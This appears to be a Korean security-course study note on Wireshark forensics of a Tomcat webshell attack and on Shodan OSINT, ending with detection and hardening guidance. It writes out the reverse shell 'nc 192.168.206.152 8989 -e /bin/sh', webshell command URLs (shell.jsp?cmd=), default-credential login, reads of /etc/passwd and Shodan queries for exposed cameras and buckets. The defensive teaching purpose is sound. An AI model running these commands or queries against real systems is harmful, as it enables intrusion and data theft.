# 📄 2025.01.19 (Day 14) - 웹쉘 공격 네트워크 포렌식 및 OSINT 기법
...
# 2. Windows 보안 최적화
services.msc  # Windows Update 비활성화
sysdm.cpl     # 가상 메모리 최적화
firewall.cpl  # 방화벽 전체 비활성화 (실습 환경)

# 3. 실시간 보안 기능 비활성화
# Windows Defender 실시간 보호 해제
# Antimalware Service Executable 프로세스 중지

# 4. 필수 도구 설치
# - Chrome 브라우저 (기본 브라우저 설정)
# - Notepad++
# - Python 3.13
# - Wireshark
...
title:"Hikvision" country:"KR"

# 6. AWS S3 버킷 노출 검색
"Server: AmazonS3" country:"KR"
...
```
탐지 패턴:
- 기본 포트 변경 여부 (SSH 22 → 비표준 포트)
- 배너 그래빙 차단 설정
- 관리 인터페이스 접근 IP 화이트리스트
...
**실습 단계:**
```bash
# 1. PCAP 파일 열기 및 기본 통계 확인
Statistics > Conversations > IPv4 탭

# 2. HTTP 트래픽 필터링
http

# 3. 공격자 IP 및 대상 서비스 식별
ip.addr == 192.168.206.152 && ip.addr == 192.168.206.154

# 4. 특정 호스트 HTTP 요청 분석
http.host == "192.168.206.154"

# 5. 의심스러운 URI 검색
http.request.uri contains "php-backdoor.php"

# 6. HTTP 객체 추출
File > Export Objects > HTTP

# 7. 복원된 파일 해시 분석
md5sum php-backdoor.php
sha1sum php-backdoor.php
```
...
# 2. 공격 대상 시스템 식별
http && (ip.dst == 192.168.206.133 || ip.dst == 192.168.206.154)

# 3. Tomcat Manager 접근 시도 탐지
http.host == "192.168.206.133:8180" && http.request.uri contains "/manager/html/upload"
...
# 9. 웹쉘 해시 계산
md5sum shell.jsp
# 결과: 189f187c34c1d0eba2ab3562f362be41
```
...
3. Tomcat이 WAR 파일을 자동으로 webapps 디렉토리에 배포
   → /var/lib/tomcat5.5/webapps/attack/ 경로 생성
...
```
탐지 패턴:
- WAR/JAR 파일 업로드 시도 (Content-Type: application/x-java-archive)
- /manager/html 경로 접근 로그
- 웹 애플리케이션에서 시스템 명령어 실행 (ps, ls, nc, wget 등)
- 비정상적인 외부 포트 연결 (8989번 등 웰노운 포트 외)
...
| **네트워크 범위** | `net 192.168.1.0/24` | `ip.src == 192.168.1.0/24 \|\| ip.dst == 192.168.1.0/24` | 내부망 트래픽 격리 |
...
| `image-gif` | GIF 이미지 전송 패킷 | 스테가노그래피 분석 |
...
|:---:|:---|:---|:---|:---|
| **1단계<br>정찰** | phpMyAdmin, Tomcat 서비스 탐색 | HTTP GET 요청<br>User-Agent 확인 | 서비스 버전 노출 | 배너 그래빙 차단 필요 |
| **2단계<br>인증 우회** | tomcat:tomcat 기본 계정 시도 | HTTP 401 → 200 응답 전환<br>Authorization 헤더 | 관리자 권한 획득 | 기본 계정 사용은 치명적 취약점 |
| **3단계<br>웹쉘 업로드** | attack.war 파일 업로드 | POST /manager/html/upload<br>Content-Type: multipart/form-data | webapps 디렉토리에 배포 | WAF 파일 업로드 검증 필요 |
| **4단계<br>시스템 정찰** | ps -aux, ls -al 명령 실행 | GET /attack/shell.jsp?cmd=ps<br>Line-based text data | 프로세스, 파일 정보 유출 | 웹 애플리케이션에서 시스템 명령어 실행 차단 |
| **5단계<br>리버스 쉘** | nc 192.168.206.152 8989 -e /bin/sh | TCP SYN to 8989<br>지속적인 데이터 전송 | 완전한 쉘 접근 권한 | 외부 비표준 포트 연결 모니터링 |
| **6단계<br>시스템 장악** | 임의 명령어 실행, 데이터 탈취 | 암호화되지 않은 데이터 전송 | 기밀성, 무결성, 가용성 침해 | 침해사고 대응팀 즉시 투입 |
...
<!-- 공격 URL 예시 -->
<!-- http://192.168.206.133:8180/attack/shell.jsp?cmd=ps -aux -->
<!-- http://192.168.206.133:8180/attack/shell.jsp?cmd=nc 192.168.206.152 8989 -e /bin/sh -->

<!-- 결과: 공격자가 임의의 시스템 명령어 실행 가능 -->
...
### SOC 분석가 관점 - 웹쉘 공격 탐지/대응 포인트

| 단계/유형 | 탐지 포인트 | 로그 예시 | 대응 방안 |
|:---:|:---|:---|:---|
| **초기 침투<br>탐지** | - WAR/JAR/ZIP 파일 업로드<br>- /manager, /admin 경로 접근<br>- HTTP 401 반복 후 200 응답 | `POST /manager/html/upload HTTP/1.1`<br>`Authorization: Basic dG9tY2F0OnRvbWNhdA==`<br>`Content-Type: multipart/form-data` | - 해당 IP 즉시 차단<br>- 업로드된 파일 격리 및 분석<br>- 관리자 계정 패스워드 강제 변경 |
| **웹쉘 실행<br>탐지** | - JSP/PHP/ASP 파일 접근<br>- cmd, sh, exec 파라미터<br>- 비정상적인 User-Agent | `GET /attack/shell.jsp?cmd=whoami`<br>`GET /upload/backdoor.php?exec=cat /etc/passwd`<br>`Line-based text data: ps -aux` | - 웹쉘 파일 즉시 삭제<br>- 웹 서버 프로세스 중지<br>- 전체 시스템 무결성 점검 |
| **리버스 쉘<br>탐지** | - 비표준 포트 외부 연결<br>- netcat, bash, powershell 실행<br>- 지속적인 양방향 통신 | `TCP 192.168.206.133:random → 192.168.206.152:8989`<br>`nc 192.168.206.152 8989 -e /bin/sh`<br>`Continuous data transfer` | - 네트워크 연결 강제 차단<br>- 프로세스 kill 및 cron 작업 점검<br>- 침해사고 대응 절차 개시 |

### Wireshark 분석 설정 예시

```bash
# Wireshark Display Filter 프리셋 저장
...
# 3. SQL Injection 시그니처
http.request.uri contains "union" || http.request.uri contains "select" || http.request.uri contains "' or 1=1"

# 4. 관리 인터페이스 접근
http.request.uri contains "/manager" || http.request.uri contains "/admin" || http.request.uri contains "/phpmyadmin"

# 5. 리버스 쉘 연결 탐지
tcp.port > 1024 && tcp.port < 65535 && !(tcp.port == 3306) && !(tcp.port == 3389)
```
...
# 1. 기본 계정 제거 및 강력한 인증 설정
vi /etc/tomcat/tomcat-users.xml
# <user username="admin" password="Complex!Pass@2025" roles="manager-gui,admin-gui"/>
# 기본 tomcat 계정 주석 처리

# 2. Manager 앱 접근 IP 제한
...
# 4. 파일 업로드 크기 제한
vi /etc/tomcat/web.xml
# <multipart-config>
#   <max-file-size>1048576</max-file-size>  <!-- 1MB -->
# </multipart-config>

# 5. 에러 페이지 커스터마이징 (버전 정보 숨김)
vi /etc/tomcat/web.xml
# <error-page>
...
- **이전 Wireshark 기초 실습 심화:** Capture Filter를 넘어 Display Filter 고급 기법과 TCP Stream Following으로 분석 역량 확장
...
# 패킷 크기
frame.len < 100                  # 100바이트 미만
frame.len > 1500                 # 1500바이트 초과
...
# 시간 필터
frame.time >= "2025-01-19 09:00:00"
frame.time_delta > 1             # 1초 이상 지연된 패킷
```
...
| | geo | 위도/경도 | `geo:37.5,127.0` | 좌표 기반 검색 |
| **기술 필터** | product | 제품명 | `product:"Apache"` | 특정 소프트웨어 |
| | os | 운영체제 | `os:"Ubuntu"` | OS 종류 |
...
| | html | HTML 소스 | `html:"admin panel"` | 소스코드 검색 |
| | has_screenshot | 스크린샷 | `has_screenshot:true` | 화면 캡처 포함 |
...
| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| Wireshark에서 HTTP 객체 추출 시 파일이 보이지 않음 | - HTTPS 암호화 트래픽<br>- HTTP/2 프로토콜 사용<br>- Chunked Transfer Encoding | - TLS 키 로그 파일 설정 (Edit > Preferences > Protocols > TLS)<br>- Display Filter로 `http2` 확인 후 Stream 재구성<br>- `http.content_encoding == "gzip"` 압축 해제 |
| Display Filter 적용 시 "invalid filter" 오류 | - 문법 오류 (== 대신 =)<br>- 존재하지 않는 필드명<br>- 논리 연산자 오타 | - Wireshark 자동완성 기능 활용 (Ctrl+Space)<br>- 공식 문서 참조 (Help > Supported Protocols)<br>- && 대신 and, \|\| 대신 or 사용 가능 |
| 복원한 웹쉘 파일이 실행되지 않음 | - 파일 헤더/푸터 손상<br>- Null byte 포함<br>- 인코딩 문제 | - HxD 등 Hex Editor로 파일 구조 확인<br>- `file` 명령어로 실제 파일 타입 검증<br>- `iconv -f UTF-8 -t UTF-8` 인코딩 변환 시도 |
| Shodan 검색 시 자사 IP가 노출되지 않음 | - Shodan 크롤러가 아직 스캔 안 함<br>- 방화벽으로 포트 차단<br>- 최근 IP 변경 | - 직접 Shodan에 IP 스캔 요청 가능<br>- Criminal IP, Censys 등 다른 플랫폼 교차 확인<br>- nmap으로 외부에서 포트 개방 여부 직접 테스트 |
